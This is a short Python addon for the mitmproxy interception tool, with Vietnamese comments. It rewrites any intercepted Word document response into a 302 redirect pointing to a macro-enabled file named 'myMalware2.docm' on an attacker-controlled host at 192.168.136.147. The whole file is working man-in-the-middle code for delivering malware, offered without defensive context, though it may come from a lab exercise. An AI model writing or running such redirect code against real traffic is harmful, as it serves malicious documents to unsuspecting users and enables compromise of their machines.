from mitmproxy import ctx, http

class RedirectDOCtoDOCM:
    def responseheaders(self, flow: http.HTTPFlow):
        # Kiểm tra xem response có phải là một file DOC không
        content_type = flow.response.headers.get("Content-Type", "").lower()

        if content_type.startswith("application/msword"):
            # Thay đổi header "Location" để chuyển hướng đến file b.docm
            flow.response.headers["Location"] = "https://192.168.136.147/myMalware2.docm"
            # Thay đổi status code thành 302 Found để thực hiện chuyển hướng
            flow.response.status_code = 302

            # Ghi log để theo dõi các truy vấn đã thay đổi
            ctx.log.info("Chuyển hướng từ .doc sang .docm")

addons = [
    RedirectDOCtoDOCM()
]
